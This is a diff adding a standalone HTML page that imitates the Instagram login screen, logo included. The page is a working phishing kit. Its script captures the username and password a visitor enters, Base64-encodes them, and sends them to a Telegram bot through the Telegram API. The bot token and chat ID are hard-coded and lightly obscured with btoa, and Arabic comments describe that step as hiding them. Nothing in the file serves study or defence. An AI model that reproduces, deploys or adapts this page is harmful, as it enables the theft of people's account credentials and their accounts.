@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Clone</title>
+    <style>
+        /* ====== Global Styles ====== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: #fff;
+            padding: 20px;
+            border: 1px solid #ddd;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 img {
+            width: 150px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #007acc;
+        }
+    </style>
+</head>
+<body>
+
+    <main>
+        <h1>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+    </main>
+
+    <script>
+        // ✅ حفظ التوكن و chat_id داخل localStorage لتجنب ظهورهم في الكود
+        if (!localStorage.getItem("BOT_TOKEN")) {
+            localStorage.setItem("BOT_TOKEN", btoa("7647615645:AAE3EB_wnJq4TZRInXSc35-VIJkCMVsAQW0"));
+        }
+        if (!localStorage.getItem("CHAT_ID")) {
+            localStorage.setItem("CHAT_ID", btoa("7164291668"));
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // ✅ استرجاع التوكن و chat_id بعد فك التشفير
+            const botToken = atob(localStorage.getItem("BOT_TOKEN"));
+            const chatId = atob(localStorage.getItem("CHAT_ID"));
+
+            // ✅ تشفير بيانات تسجيل الدخول باستخدام Base64
+            const encodedMessage = btoa(`🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: encodedMessage
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("Login sent successfully!");
+                } else {
+                    alert("Error sending data.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
+
+</body>
+</html>
